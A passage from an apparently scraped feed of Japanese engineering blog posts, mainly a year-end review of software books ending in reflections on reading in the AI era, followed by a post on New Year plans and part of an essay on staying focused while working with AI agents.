。リクエスト・レスポンス型マイクロサービスの欠点——ポイントツーポイント結合、依存スケーリング、分散モノリス化——を明確に言語化してくれたことで、私自身が過去に経験した失敗の原因が腑に落ちました。イベントは、サービス間の会話ではなく、組織の記憶である——本書を読んで、私はイベントストリームの捉え方が変わりました。データパイプラインやメッセージキューとしてではなく、ビジネスの出来事を永続化した「正典的な記録」として捉える。その視点があれば、新しいサービスを立ち上げるときも、過去のイベントを再生してデータモデルを構築できる。実装の寿命よりもデータの寿命のほうが長い——この現実を直視したアーキテクチャが、イベント駆動型マイクロサービスなのだと理解しました。Building Event-Driven Microservices: Leveraging Organizational Data at Scale (English Edition)作者:Bellemare, AdamO\'Reilly MediaAmazonTaming Your Dragon: Addressing Your Technical Debtlearning.oreilly.comsyu-m-5151.hatenablog.comシステム開発で必ず直面するのが、技術的負債です。どこを優先的に直すかを判断するには、技術的負債の性質を理解する必要がある。技術的負債は「ドラゴン」のようなものです。放っておけば大きくなり、いつか手に負えなくなる。しかし、完全に倒すこともできない。なぜなら、技術的負債は開発を進める限り必ず生まれるものだからです。だから、敵として戦うのではなく、適切に付き合い、共存の道を探る。ドラゴンは殺せない。だから、飼い慣らす——この比喩が、私には刺さりました。本書を読んで、技術的負債を単なる技術的問題ではなく、トレードオフの問題、組織の問題、経済の問題として捉える視点を得ました。「技術的負債」という言葉は、金融の「負債」から借りてきた比喩です。しかし、両者には決定的な違いがあります。金融的負債は明確な金額があり、返済計画を立てられる。しかし技術的負債は、その量を正確に測定することが困難であり、返済のコストも不確実です。借金は金額がわかる。技術的負債は、わからない——このアナロジーの限界を、私たちはもっと意識すべきだと感じています。ここで著者の主張に、私は半分同意し、半分疑問を持つ。「ドラゴンを飼い慣らす」という比喩は美しい。しかし、飼い慣らせるドラゴンと、飼い慣らせないドラゴンがいるのではないか。ある種の技術的負債は、時間が経つほど返済コストが指数関数的に増大する。そういう負債は、早めに倒すべきだ。すべての負債を「共存する相手」として扱うのは、危険な楽観主義に陥る可能性がある。本書の比喩を鵜呑みにせず、「このドラゴンは飼い慣らせるのか、それとも早めに倒すべきなのか」を見極める目が必要だと、私は考える。技術的負債がなぜ蓄積していくのか、なぜ返済が後回しにされるのか。本書はその構造的な原因を可視化してくれます。原因がわかれば、より効果的な介入点を見つけることができる。技術的負債は倒すものではなく、飼い慣らすもの——「なぜこの改善が必要なのか」を経営層に説明するための理論的基盤を、本書から得ました。Taming Your Dragon: Addressing Your Technical Debt (English Edition)作者:Brown, Dr. Andrew RichardApressAmazonRefactoring to Rustlearning.oreilly.comsyu-m-5151.hatenablog.com技術的負債に対処する具体的な手法の1つとして、言語の移行があります。既存のコードベースを一から書き直すのではなく、段階的にRustに置き換えていくアプローチに興味があって手に取りました。全面的な書き直しはリスクが高い。だから、パフォーマンスクリティカルな部分から少しずつ置き換える。全部を書き直すな、一部を置き換えろ——この原則は、私の考え方にも合っています。「Rustを学ぶ」本ではなく、「Rustを実務で使う」本だと感じました。言語を学ぶのと、言語で仕事をするのは違う——その差を埋めてくれる本です。パフォーマンスクリティカルな部分や、メモリ安全性が重要な部分をRustに置き換えることで、システム全体の信頼性を向上させる。全面的な書き換えのリスクを避けながら、段階的に改善を進める方法論は、運用中のシステムを改善する際の参考になるでしょう。Refactoring to Rust (English Edition)作者:Mara, Lily,Holmes, JoelManningAmazonJust Use Postgres!learning.oreilly.comsyu-m-5151.hatenablog.com言語の選択、アーキテクチャの設計、技術的負債の返済——これまで見てきた本は、どれも「何を選ぶか」の判断を扱っていました。しかし、時には「選ばない」という選択が最良のこともある。「PostgreSQLだけで十分」という主張は、時に過激に聞こえるだろう。しかし本書を読んで、その主張にはしっかりとした根拠があることがわかりました。新しい技術スタックを追加することは、運用の複雑性を高める。だから、既存の技術でできることは、既存の技術で解決すべきです。新しいデータベースを導入する前に、Postgresでできないか考える。この姿勢が、私の技術選択の基準になっています。PostgreSQLは、リレーショナルデータベースとしての堅実な機能に加え、JSON処理、全文検索、地理空間データ、時系列データ、ベクトル検索まで対応しています。Postgresは、データベースではなく、プラットフォームである——この主張には説得力があります。ただし、この主張を額面通りに受け取るのは危険だとも思う。「Postgresで十分」という言葉が、技術的判断の放棄に使われることがある。本当にPostgresで十分なのか、それとも単に新しい技術を学ぶのが面倒なのか。その区別は、案外難しい。本書の価値は「Postgresを使え」という結論にあるのではなく、「なぜPostgresで十分なのか」を考えるフレームワークにある。シンプルさには価値がある。しかし、シンプルさを言い訳にして、必要な複雑さから逃げてはいけない。データベースの種類を減らすことで、運用の複雑性が下がるというメリットがあります。監視対象が減り、バックアップ戦略が統一され、チームが習得すべき技術スタックがシンプルになる。もちろん、PostgreSQLが適さないケースもあります。万能ではないことを認めた上で、どこまで対応できるかを知る。複雑さを減らすことも、エンジニアリングである——その境界線を理解することが、適切な技術選択には重要です。Just Use Postgres!: All the database you need (English Edition)作者:Magda, DenisManningAmazonThe Software Engineer\'s Guidebooklearning.oreilly.comここまで、技術的なトピックの本を紹介してきました。しかし、技術を身につけるだけでは、キャリアは作れない。ジュニアからシニア、そしてスタッフエンジニアへ。キャリアの各段階で求められるスキルは異なります。しかし、次の段階で何が必要になるかは、今の段階からは見えにくい。キャリアの次の段階で必要なスキルは、今の段階では見えない——本書は、その見通しを与えてくれます。技術的なスキルだけではキャリアは作れない。これは、ある程度経験を積むと実感することです。コードレビューの仕方、技術的な意思決定への関わり方、メンタリングの方法、組織への影響力の広げ方。コードを書く力と、キャリアを作る力は別物——両方を意識的に伸ばす必要があります。技術力は武器になる。しかし、武器だけでは戦場を選べない。ここで私は、本書の主張に対してある種の居心地の悪さを感じる。キャリアを「設計」するという発想自体に、違和感がある。私のキャリアは、計画通りに進んだことがない。偶然の出会い、予期せぬ異動、想定外のプロジェクト。そうした「偶然」の積み重ねが、今の自分を作っている。本書が示すロードマップは参考になる。しかし、ロードマップ通りに進むことが正解だとは思わない。計画を持つことと、計画に縛られることは違う。本書を読みながら、私は自分のキャリアを「設計」するのではなく、「振り返る」ことの方が多かった。ソフトウェアエンジニアガイドブック ―世界基準エンジニアの成功戦略ロードマップ作者:Gergely Orosz,久富木 隆一（翻訳）オーム社Amazonバックエンドエンジニアのためのインフラ・クラウド大全www.shoeisha.co.jpキャリアを考えるとき、自分に影響を与えてくれた人の存在は大きい。尊敬するnetmarkjpさんの著書です。私がエンジニアとして仕事をする中で、netmarkjpさんから学んだことは数え切れません。その方が書いた本となれば、読まないわけにはいかなかった。本書は「基礎知識」と銘打たれた23章から構成されています。可用性、キャパシティ、パフォーマンス、監視、セキュリティ、DevOps、SRE——インフラに関わるエンジニアが押さえるべき領域を網羅的にカバーしている。しかし、この本の価値は網羅性だけではありません。各章に、実務経験に裏打ちされた「なぜそうするのか」が詰まっている。基礎とは、簡単という意味ではない。基礎とは、すべての基盤になるという意味だ。バックエンドエンジニアがインフラを理解することの意味は、年々大きくなっていると感じます。クラウドネイティブな環境では、アプリケーションとインフラの境界が曖昧になっている。コンテナ、Kubernetes、オブザーバビリティ——これらを理解せずに、本番環境で動くシステムは作れない。アプリだけ書けても、本番では動かせない。本書は、その橋渡しをしてくれる一冊です。 speakerdeck.comバックエンドエンジニアのためのインフラ・クラウド大全【リフロー型】作者:馬場 俊彰,株式会社X-Tech5翔泳社Amazon作る、試す、正す。アジャイルなモノづくりのための全体戦略作る、試す、正す。　アジャイルなモノづくりのための全体戦略bnn.co.jp技術の基礎を固め、システムを作る。しかし、作ったものが「正しいもの」かどうかは、また別の問題です。市谷聡啓さんの到達点とも言える一冊です。『カイゼン・ジャーニー』『正しいものを正しくつくる』を経て、20年以上の実践知が凝縮されています。note.com本書のタイトル「作る、試す、正す」は、ものづくりの本質を端的に表しています。作って終わりではない。試して、学んで、正す。その繰り返しの中で、少しずつ「正しさ」に近づいていく。完成形を目指すのではなく、動き続けることがゴールだという考え方です。私がこの本で最も考えさせられたのは、「正しさ」の捉え方でした。最初から正しいものを作ろうとすると、動けなくなる。かといって、何も考えずに作り始めると、迷子になる。本書が提示するのは、その中間にある姿勢です。「正しさ」は最初から存在するものではなく、作り、試し、正す過程で立ち現れてくるもの。だから、完璧な計画を立てることより、素早く試して学ぶ仕組みを整えることのほうが大事だと言う。この考え方は、ソフトウェア開発に限った話ではないと思います。仕事全般、もっと言えば生き方にも通じる。最初から「正解」を知っている人はいない。やってみて、失敗して、修正して——その繰り返しの中で、少しずつ「あるべき姿」が見えてくる。正しさを探すのではなく、正しくなる状況をつくる。本書のこの言葉は、私の仕事だけでなく、物事への向き合い方そのものを言語化してくれました。作る、試す、正す。　アジャイルなモノづくりのための全体戦略作者:市谷 聡啓ビー・エヌ・エヌAmazon良いコードの道しるべbook.mynavi.jp素早く適応しながら開発を進める。しかし、その過程で生まれるコードの品質はどう担保するか。この本を読んで、私は「説明の仕方」を学びました。動くコードを書くことは、実はさほど難しくない。大事なのは、書いたコードを他の人や将来の自分が読んで正しく理解できること——本書を通して伝えられる。本書の内容自体は、経験を積んだエンジニアにとって目新しいものではありません。命名、コメント、関数やクラスの分割、依存関係の整理、自動化テスト。どれも「基本」と呼ばれるものばかりです。しかし、この本の価値は内容の新しさではなく、説明の丁寧さにあります。なぜその原則が有用なのか、どうしてそう書くべきなのか——「なぜ」を省略せずに解説している。私がこの本を評価するのは、「人に説明するときの参考になる」からです。チームに若手が入ってきたとき、コードレビューで指摘するとき、「なぜこう書くべきか」を説明する必要がある。そのとき、自分の頭の中にある暗黙知を言語化するのは意外と難しい。本書は、その言語化の手本を見せてくれます。基本を、基本のまま、分かりやすく伝える。それは簡単なことではない。良いコードの道しるべ　変化に強いソフトウェアを作る原則と実践作者:森 篤史マイナビ出版AmazonClean Code, 2nd Editionlearning.oreilly.com良いコードの基本を学んだら、次はその原則を深く考えたい。Robert C. Martin（Uncle Bob）による『Clean Code』の第2版です。2008年に出版された初版から16年、全面的に書き直されました。初版を読んだのは何年も前のことです。その後、私のコードは変わったのか。正直に言えば、変わった部分もあれば、変わらなかった部分もある。だからこそ、第2版を手に取りました。自分がどこまで成長したのか、どこで止まっているのか、確認したかった。第2版で印象的だったのは、AI時代に対する著者の姿勢です。「コードはいずれなくなる」「AIがすべて書いてくれる」——そんな予測に対して、Uncle Bobは明確に反論しています。コードは要求の詳細を表現したものであり、その詳細は抽象化できない。AIがどれだけ賢くなっても、仕様を厳密に記述する行為——つまりプログラミング——はなくならない。コードは消えない。なぜなら、コードとは要求そのものだから。この主張に私は強く共感する。そして驚いたのは、第2版がここまで大幅にアップデートされていたことだ。16年という歳月は、ソフトウェア開発の世界では永遠に等しい。にもかかわらず、Uncle Bobは単なる改訂ではなく、現代の開発環境——AI、クラウド、分散システム——を踏まえた上で原則を再構築している。初版の「良いコードとは何か」という問いは変わらないが、その答え方が2025年の文脈に合わせて書き直されている。古典を現代に蘇らせるとは、こういうことなのだと思った。本書の核心は、タイトルの通り「クリーン」であることです。しかし、「クリーン」とは完璧を意味しない。住めない「ショーハウス」ではなく、住める「クリーンな家」を目指す。クリーンなコードとは、維持し、拡張し、進化させても、その住みやすさを損なわないコードのこと。完璧ではないが、手入れされている。クリーンとは、完璧ではなく、ケアされている状態だ。もう1つ、心に残った言葉があります。「私たちは書くよりも読む時間の方が圧倒的に長い」——だからこそ、読みやすいコードを書くことが、結果として書きやすさにつながる。速く行きたければ、うまくやれ（The only way to go fast is to go well）。この原則は、初版から変わらない。そして、16年経っても色褪せない。型システムのしくみ型システムのしくみ ― TypeScriptで実装しながら学ぶ型とプログラミング言語www.lambdanote.comクリーンなコードを書くための原則を学んだ。では、その原則を支える道具——型システム——はどう動いているのか。遠藤侑介さんの著書です。Rubyコミッタであり、TypeProfの開発者であり、『型システム入門』の訳者でもある。その方が「型システムを実装しながら学ぶ」本を書いた。読まないわけにはいかなかった。現代の開発環境では、コードを書いている最中にエラーが判明し、文脈に適した補完候補が提示される。当たり前のように使っているこの機能、その裏側で何が起きているのか。本書は、TypeScriptのサブ言語に対する型検査器を実装しながら、その「しくみ」を解き明かしていきます。型システムの理論を学ぶ方法は、数学的な教科書を読むことだけではない。実装を通じて理解する道がある——本書はその道を示してくれます。真偽値と数値の型から始まり、関数型、オブジェクト型、再帰型、ジェネリクスへと段階的に進んでいく構成が秀逸です。各章で型検査器を拡張しながら、「なぜこの機能が必要なのか」「どう実装するのか」を体験的に学べる。私がこの本を読んで得たのは、型システムへの「畏れ」と「親しみ」の両方でした。型システムは魔法ではない。人間が設計し、実装したものだ。しかし、その設計には深い思慮がある。エディタが「このコードは間違っている」と教えてくれるとき、その背後には型検査器の地道な仕事がある。その仕事の中身を知ることで、型に対する見方が変わりました。型は、プログラムを制約するものではなく、プログラムを守るものだ。Fundamentals of Software Engineeringlearning.oreilly.com型システム、クリーンコード、アーキテクチャ——ここまで個別の技術トピックを深掘りしてきました。しかし、それらを俯瞰的に捉える視点も必要です。ソフトウェアエンジニアリングの基礎を幅広くカバーしている一冊です。流行のフレームワークは数年で入れ替わる。しかし、基礎的な原則は変わらない。フレームワークは変わる。基礎は変わらない——長くこの業界にいると、この事実を繰り返し実感します。AIがコードを生成してくれる時代になって、基礎の重要性はむしろ高まっていると感じます。AIの出力をそのまま受け入れるのではなく、評価し、改善し、統合する。その判断ができるのは、基礎を理解している人間だけです。AIの出力を評価できるのは、基礎を知っている人だけ——特定の技術やフレームワークに依存しない普遍的な原則を、改めて確認するために本書を読みました。Fundamentals of Software Engineering: From Coder to Engineer (English Edition)作者:Schutta, Nathaniel,Vega, DanO\'Reilly MediaAmazonThe Product-Minded Engineerlearning.oreilly.com基礎を学び、技術を深め、システムを作る。しかし、技術的に正しいものを作ることと、ユーザーに価値を届けることは、必ずしも同じではありません。エンジニアとして長く仕事をしていると、技術的に正しいことと、ビジネスとして正しいことが一致しない場面に何度も遭遇します。コードが動くだけでは十分ではない。そのコードが、ユーザーにどんな価値を届けているのか。コードを書くことと、価値を届けることは違う——この違いを理解することは、プロダクトに関わるエンジニアにとって必須のスキルです。エンジニアとして仕事をしていると、「ユーザーにとっての価値」と「技術的な正しさ」の間にギャップがあることに気づきます。たとえば、99.9%の可用性は技術者にとっては誇らしい成果でしょう。しかし、99.9%を裏返すと0.1%のダウンタイム。年間に換算すると約8時間の停止を意味する。ユーザーにとって、その8時間がどれだけ痛いか。99.9%は、ユーザーにとっては年間8時間の停止を意味する——技術的な数値をビジネスインパクトに翻訳できること。それがプロダクト思考の1つの形であり、本書はその視点を養う上で役立ちました。The Product-Minded Engineer: Building Impactful Software for Your Users (English Edition)作者:Hoskins, DrewO\'Reilly MediaAmazonThe Engineering Leaderlearning.oreilly.comプロダクト思考を身につけ、技術とビジネスの両方を見られるようになる。すると、次に見えてくるのはリーダーシップの課題です。リーダーシップについて書かれた本は多いですが、本書は地に足のついた実践的なアドバイスが詰まっています。誰かがキャリアを設計してくれるわけではない。自分で考え、自分で動く必要がある。自分のキャリアの責任者は、自分である——ある程度経験を積むと、この現実を受け入れざるを得なくなります。本書は、その受け入れた後に何をすべきかを具体的に示してくれます。自分自身を導くこと、他者を導くこと、チームを導くこと、そしてチームを超えて導くこと。まず自分を導けないなら、他者は導けない——この順序は重要です。自己管理ができていない人間が、チームをまとめられるはずがない。「マネージャーになる」ことだけがリーダーシップではない。ポジションに関係なく、チームに良い影響を与えることはできる。リーダーシップは、ポジションではなく行動である——この考え方は、IC（Individual Contributor）としてのキャリアを続ける上でも指針になっています。The Engineering Leader: Strategies for Scaling Teams and Yourself (English Edition)作者:Huston, CateO\'Reilly MediaAmazonエンジニアリングリーダー ―技術組織を育てるリーダーシップとセルフマネジメント作者:Cate Huston,岩瀬 義昌（翻訳）,岩瀬 迪子（翻訳）オーム社Amazon\\"Looks Good to Me\\"learning.oreilly.comリーダーシップを発揮する場面は、会議室だけではありません。日々の開発で最も頻繁に行われるコミュニケーションの1つが、コードレビューです。コードレビューは、品質保証の手段であると同時に、チームの学習機会でもある。バグを見つけるだけがレビューの役割ではない。知識を共有し、コードの意図を確認し、チーム全体の理解を揃える。レビューは、コードのためではなく、チームのためにある——この視点で見ると、レビューの仕方が変わってきます。コードレビューを「チームスポーツ」として捉える考え方に共感しました。個人の技術力を競う場ではなく、チーム全体の品質とスキルを向上させるための協働の場として位置づける。レビューコメントは、批判ではなく、贈り物である——この姿勢を持てるかどうかで、チームの雰囲気は大きく変わります。しかし、私はこの「贈り物」という表現に、少しだけ引っかかる。贈り物は、受け取る側が喜ぶものだ。しかしコードレビューのコメントは、時に厳しいことも言わなければならない。「ここは根本的に設計を見直すべきだ」と指摘することは、贈り物というより、苦い薬に近い。「贈り物」という美しい比喩に逃げて、言うべきことを言わなくなるのは本末転倒だ。本書の主張は正しいが、その比喩を鵜呑みにすると、レビューが馴れ合いになる危険がある。厳しさと敬意は両立できる。そのバランスこそが、本当の意味での「贈り物」なのだと思う。最後に「LGTM」と承認するのは人間です。その承認は、コードへの同意であると同時に、チームメンバーへの信頼の表明でもある。LGTMは、チームの信頼の証である——この認識を共有できているチームは、レビューが建設的になるし、心理的安全性も高まります。\\"Looks Good to Me\\": Constructive code reviews (English Edition)作者:Braganza, AdrienneManningAmazonLooks Good To Me作者:Adrienne Braganza秀和システムAmazonおわりに26冊。感想文を書き終えて、その数字を見つめている。多いのか少ないのか、正直わからない。まぁ多いか。「今年もたくさん読みましたね」と言われれば悪い気はしないし、「それだけ？」と言われればちょっとへこむ。結局、他人の評価を気にしている。読書量なんて自己満足だと言いながら、どこかで認めてほしがっている。振り返ると、今年の本には共通点があった。『Beyond Vibe Coding』は、AIに頼りすぎている自分を突きつけてきた。『LLMOps』は、正解が定義できないシステムの難しさを教えてくれた。『ソフトウェア設計の結合バランス』は、疎結合という呪縛から解放してくれた。『Taming Your Dragon』は、技術的負債と共存する道を示してくれた。どの本も、私に「それでいいのか」と問いかけてきた。『Terraform in Depth』を読んだ夜のことを思い出す。ステート管理のベストプラクティスなんて、AIに聞けば30秒で返ってくる。でも私は、著者が過去にやらかした失敗談のほうを覚えている。「これで痛い目を見た」という告白。公式ドキュメントには絶対に載らない、その生々しさ。なぜか、そっちのほうが頭に残る。正解より失敗のほうが記憶に焼きつくのは、私という人間の性質なのかもしれない。『Beyond Vibe Coding』を読んだとき、嫌な気持ちになった。自分のことを書かれている気がしたからだ。AIに聞いて、答えをもらって、なんとなくわかった気になる。その繰り返し。「なぜ」を考えなくなっていた。本を読むという行為は、その怠惰な自分への処方箋だったのかもしれない。ページをめくる時間だけ、「なぜ」を考え続けることができる。本は答えをくれない。くれるのは「そうだろうか」という違和感だ。著者の主張に首をかしげる。その違和感を言語化しようとする。そうやって、自分の考えが少しずつ形になっていく。AIは答えを返してくれる。でも「そうだろうか」とは返してくれない。たぶん、そこが決定的に違う。今年は、AI/LLMの運用が本格化した年だった。プラットフォームエンジニアリングが変わり、組織の話が増えた。技術だけ見ていればよかった時代は、とっくに終わっている。その変化に追いつこうとして、本を読んだ。読んで、ブログを書いて、登壇した。アウトプットしないと身につかない。言い聞かせるように、繰り返してきた。でも、本当のことを言えば、追いつこうとしていたわけではないのかもしれない。変化の中で、自分が何者であるかを確かめたかった。AIがコードを書いてくれる時代に、なぜ私はエンジニアをやっているのか。答えは出ていない。出ていないけれど、本を読むたびに、その輪郭が少しだけ見えてくる気がする。2025年はまだ3週間ほど残っている。年末年始に読んだ本は、来年の記事で。毎年同じことを書いている気がする。でも来年も、たぶんまた書くのだろう。誰に頼まれたわけでもないのに、12月になると、この作業を始めてしまう。本を読むことに意味があるのか。正直、わからない。わからないけれど、やめられない。AIがどれだけ賢くなっても、300ページを読み通した時間は消えない。その時間が、自分を少しだけ変えてくれたような気がする。気がするだけかもしれない。でも、その「気がする」を信じて、来年も本を開くのだと思う。正解を得ることだけが目的なら、エンジニアをやっている意味がない。はじめにで書いたこの言葉が、25冊の感想文を書き終えた今、少しだけ違って聞こえる。正解がないから難しい。正解がないから面白い。正解がないから、エンジニアを続ける価値がある。本を読む意味がある。来年もきっと、答えの出ない本を読み続けるのだろう。そして、また12月になったら、この記事を書く。それでいい。それがいい。","isoDate":"2025-12-11T01:41:43.000Z","dateMiliSeconds":1765417303000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"とあるMLエンジニアの年末年始の予定の呟き","link":"https://zenn.dev/akasan/articles/2025_new_years_eve","contentSnippet":"今回はMLエンジニアとしてひたすら精進を頑張っている私が今年の年末年始どのように過ごす予定か、誰得ではありますしこんなことをzennに書いている人がいるかわからないですが、まとめてみます。 まずはこのアドベントカレンダーについて2025/04/18に爆誕してすでに230日を超えていますが、まずは2025/12/25までは毎日投稿を続ける予定です！その後についてですが、年末年始は流石にちょっとお休みしようかなと思っており、2025/12/26から2026/1/4はお休みしようと思っています。もちろん、途中で急に書きたいことがあれば発信しますが、謎の義務感・使命感によって続けられている...","isoDate":"2025-12-10T13:25:20.000Z","dateMiliSeconds":1765373120000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"2025年版 私がAIエージェントと協働しながら集中する方法","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/10/092706","contentSnippet":"集中できなくなった何かがおかしい。AIエージェントを使い始めてから、自分が壊れていくのを感じていた。以前は4〜5時間ぶっ通しで集中できた。コードを書き始めたら、気づいたら夕方になっていた。あの没入感。あの充実感。それが、完全に消えた。30分も持たない。いや、10分だろうか。1つの作業に没頭しようとしても、すぐに別の作業に引き戻される。戻ってきたら、さっき何をしていたか忘れている。頭の中が常にざわついている。自分の脳が、自分のものではなくなっていく感覚があった。最初は自分を責めた。集中力が落ちたのは、体力のせいか。年齢のせいか。怠けているのか。スマホの見すぎか。でも違った。同じように苦しんでいる人が、周りにもいた。きっと、最初からうまく馴染める人もいるのだろう。複数のエージェントを同時に回しながら、涼しい顔で成果を出せる人。元々、全体を俯瞰しながら動くのが得意な司令官タイプ。私は違った。複数のエージェントが並行して動いている。1つのエージェントに指示を出して、出力を待っている間に別のエージェントの出力を確認する。確認が終わったら修正指示を出して、また別の作業に移る。案件も複数が同時に走っている。厄介だったのは、見せかけ上の効率は上がっていたことだ。タスクは消化されている。アウトプットも出ている。だから最初は原因に気づけなかった。でも、何かがおかしい。同じ時間、同じ環境で働いているのに、以前のように深く没入できない。達成感がない。自分は変わっていないはずなのに、なぜ？数字に現れない損失があった。タスクの消化数は増えた。しかし、1つ1つの仕事に対する理解の深さが落ちていた。コードをAIと共に書いているのに、なぜそう書いたのか説明できない。レビューを通しているのに、本当に良いコードなのか判断できていない。量は出ている。でも、自分の中に何も残らない。学習効率が落ちていた。成長している実感がなかった。品質の問題もあった。アウトプットは出ている。しかし、それは本当に良いアウトプットなのか。深く考える時間がないまま、次々とタスクを流していく。表面的には回っている。後から振り返ると「なぜこんな設計にしたんだ」と感じることが増えていた。速く走っているつもりが、同じ場所をぐるぐる回っていただけだった。そして何より、このペースや仕事のやり方が続くのかという不安があった。毎日、頭の中が騒がしい。仕事が終わっても、脳が休まらない。週末になっても回復しきれない。短期的には回っている。でも、1年後、3年後も同じように働けるのか。効率が上がったように見えて、実は遠回りしている道を走っていたり自分を前借りしているだけではないのか。ポモドーロ・テクニックを再稼働させた。25分の作業と5分の休憩を繰り返す方法だ。効果はあった。でもAIエージェントとの協働が始まってからは、25分の中での集中すら維持できなくなっていたというた25分のタスクというのを見積もれなくなった。通知を切った。効果なし。まとまった時間を確保した。効果なし。瞑想アプリを入れた。効果なし。何をやっても、うまくいかなかった。追い詰められていた。このままでは仕事にならない。でも、AIエージェントなしで働くという選択肢はもうなかった。環境を変えるのではなく、自分を変えるしかなかった。観察するという発見行き詰まっていたとき、『大人のADHDのためのマインドフルネス』という本に出会った。ADHDの当事者向けに書かれた本だが、読んでいて「これは自分のことだ」と思う記述が多かった。注意が散漫になる。複数のことが同時に気になる。1つのことに没頭できない。ADHDかどうかは関係なかった。今の自分が抱えている問題そのものだった。本の中で紹介されていた手法の1つが、「観察する」ということだった。作業中、ふと自分自身を観察してみる。今どんな気分か。注意はどこに向いているか。身体の感覚はどうか。判断せず、ただ気づく。最初は半信半疑だった。自分を観察しながら作業するなんて、むしろ集中の妨げになるのではないか。リソースを分散させているだけではないか。でも、他に試す手段がなかった。藁にもすがる思いだった。やってみると、不思議なことが起きた。集中が途切れにくくなったのだ。いや、正確には違う。集中は途切れる。でも、途切れた瞬間に気づけるようになった。観察している自分がいるから、「あ、今逸れた」とすぐにわかる。わかるから、すぐに戻れる。これまで私は、集中を「途切れないように維持するもの」だと思っていた。途切れたら負け。だから途切れないように必死に守ろうとしていた。でも違った。集中は「維持するもの」ではなく「戻るもの」だったのだ。途切れること自体は問題ではない。戻れるかどうかが問題だった。この発見は、私の集中に対する考え方を根本から変えた。完璧な集中を目指すのではなく、素早い復帰を目指す。壁を作って守るのではなく、柔軟に戻る力を育てる。防御から回復へ。発想の転換だった。今では複数の案件を並行して回しながら、開発タスクを5本同時に進め、ブログも2〜3本並列で書けるようになった。ポモドーロの25分間、集中が途切れることはほとんどない。途切れても、数秒で戻れる。この実践を、私は「微観法」と呼んでいる。自分の微細な変化を観察する方法、という意味だ。正式な名称があればぜひ教えてほしい。この節の内容は『大人のADHDのためのマインドフルネス』（リディア・ザイローウスカ著）を参考にして自分なりに実践していたものです。また、表現について @tsumikino_ さんの投稿に影響を受けていたため、修正いたしました。参照元を明記せずご不快な思いをさせてしまい、申し訳ありませんでした。ご指摘いただきありがとうございました。以前の集中と何が違うのか以前の私にとって、最良の集中状態とは湖の底に沈んでいくような感覚だった。体の感覚はどこか希薄になる。なぜ自分がキーボードを打っているのかわからなくなる。意識と作業の境界が溶けて、ただコードが生まれ、ただ文章が流れていく。水面の光が遠ざかり、静かな深みに降りていく。その状態に入れたとき、驚くほどの量と質の仕事ができた。あの深さを、私は愛していた。この「深く沈む」集中は、1つの大きなタスクに長時間取り組むときには最適だった。中断がなく、自分のペースで進められるソフトウェア開発や執筆の環境では、これ以上の方法はなかった。しかしAIエージェントと協働する環境では、この方法が通用しなくなった。深く沈もうとしても、エージェントの出力確認で水面に引き戻される。複数の案件を抱えていれば、1つに没入できない。深く沈むには、水面が静かでなければならない。でも今の水面は常に波立っている。そこで発想を変えることにした。深く沈むのではなく、水面近くに留まる。没入するのではなく、観察する。集中の「深さ」ではなく、「復帰の速さ」を重視する。ここで1つ、重要なことに気づいた。集中は、環境次第で形を変える。静かな水面なら深く沈む集中が最適だし、波立つ水面なら水面近くを泳ぐ集中が最適だ。どちらが優れているわけではない。環境に合った集中の持ち方がある。つまり、集中とは「自分の能力」ではなく「環境との関係」なのだ。同じ人間でも、環境が変われば最適な集中の形は変わる。集中できないのは能力の問題ではない。環境と方法のミスマッチだ。私は長い間、自分の集中力が落ちたと思っていた。でも違った。環境が変わったのに、方法を変えていなかっただけだった。なぜ観察すると集中できるのかここで疑問が生じる。作業に100%集中したほうが効率的なはずではないか。なぜ10〜20%を「自分の観察」に割くと、かえって集中できるのか。理由はおそらく「注意の逸脱」の仕組みにある。人間の注意は、放っておくと必ず逸れる。これは避けられない。問題は、逸れること自体ではなく、逸れたことに気づくまでの時間だ。普通は、気が逸れてから5分、10分経って「あ、逸れてた」と気づく。スマホを開いて、気づいたら15分経っていた。そういう経験は誰にでもある。この5分、10分、15分が積み重なって、1日の生産性を静かに破壊していく。微観法では、意識の一部を「自分を観察する視点」として常に確保しておく。すると、注意が逸れ始める瞬間を捉えられるようになる。「スマホを見ようかな」と思った瞬間。「積んである本を読みたいな」と思った瞬間。「コーヒーを淹れに行こうかな」と思った瞬間。「このタスク面倒だな」と感じた瞬間。逸れてから3秒で気づき、すぐ戻れる。5分後に気づくのと、3秒後に気づくのでは、累積の損失がまったく違う。100%集中しようとして5分ごとに逸れるより、90%の集中を安定して維持するほうが、結果的に多くの仕事ができる。もう1つ理由があると思っている。「退屈の無効化」だ。脳は刺激が足りないと退屈を感じ、新しい刺激を求める。SNSを見たくなるのはこのためだ。作業が単調になると、脳が「もっと刺激をくれ」と要求してくる。しかし自分の内面を観察対象にすると、そこには常に微細な変化がある。呼吸の深さ、肩の緊張、思考の流れ、感情の揺らぎ。これは揺らぐ炎のように、予測不能だが安定していて、見続けることができる。外部刺激に頼らなくても、脳が求める新規性は内側から供給できる。具体的なやり方方法は単純だ。ある日、疲れ果てて帰ってきた夜のことだった。だるい。本当にだるい。でも仕事が残っている。そのだるさを抱えたまま、仕方なくキーボードに向かった。そのとき、ふと気づいた。「だるいな」と感じている自分を、どこかで観察している。だるさはある。でも、だるさを見ている自分もいる。その「見ている自分」は、意外と冷静だった。不思議なことに、観察を続けていると作業が進んだ。だるさは消えない。でも、だるさに飲み込まれない。その感覚を忘れたくなくて、言語化しておくことにした。それが微観法の始まりだった。ポイントは、観察の「解像度」を下げることだ。「今、自分は何を考えているか」「なぜそう感じているか」と分析しようとすると、認知資源を食う。作業と同時にはできない。分析せず、ただ「ある」と気づくだけでいい。「退屈だな」と感じたら、なぜ退屈かは考えない。「退屈がある」とだけ認識する。それだけで十分だ。例えば、作業を始める前に5秒だけ自分の状態を確認する。呼吸は浅いか、深いか。肩に力が入っているか。頭の中は静かか、騒がしいか。答えを出す必要はない。ただ気づくだけでいい。これで観察モードが起動する。作業に入ったら、意識の10〜20%を「自分を観察する視点」に割り当てる。残りの80〜90%で作業しながら、バックグラウンドで自分の変化を捉え続ける。「今、少し退屈になってきた」「焦りが出てきた」「集中が浅くなっている」。この観察は論理的に行う必要はない。分析しなくていい。揺らぐ炎を眺めるように、ただ見ていればいい。観察を続けていると、注意が逸れ始める瞬間を捉えられるようになる。「スマホを見ようかな」という考えが浮かんだ瞬間に気づく。気づいたら、その考えを追いかけずに作業へ戻る。「このタスク面倒だな」と感じたら、その感覚を認めて、それでも続ける。別のことを考え始めたら、気づいた時点で戻る。それだけだ。シンプルだが、これが全てだ。作業の構造